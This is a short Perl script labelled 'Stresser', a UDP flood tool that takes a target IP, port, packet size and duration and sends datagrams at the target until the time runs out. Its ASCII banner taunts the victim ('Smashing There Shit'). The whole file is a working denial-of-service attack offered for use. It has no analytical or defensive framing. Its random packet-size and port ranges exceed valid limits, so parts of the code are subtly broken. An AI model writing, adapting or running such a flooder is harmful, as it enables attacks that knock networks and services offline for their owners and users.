#!/usr/bin/perl##
# Stresser<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print " port " . ($port ? $port : "random") . " " .
  ($size ? "$size-byte" : "") . "                                                           
 
**//////          ******                  /*////**                     /**  
/**        **   **/**///**  *****  ******  /*   /**   ******   ******  ******
/*********/**  /**/**  /** **///**//**//*  /******   **////** **////**///**/ 
////////**/**  /**/****** /******* /** /   /*//// **/**   /**/**   /**  /**  
       /**/**  /**/**///  /**////  /**     /*    /**/**   /**/**   /**  /**  
 ******** //******/**     //******/***     /******* //****** //******   //** 
////////   ////// //       ////// ///      ///////   //////   //////     //   
                         +(Swat Nets Are Getting Trapped In Your Router Kid)+
                   To Stop Smashing There Shit Press Ctrl-C
" .
  ($time ? "" : "") . "\n";
print "To stop smashing there shit press Ctrl-C\n" 
unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
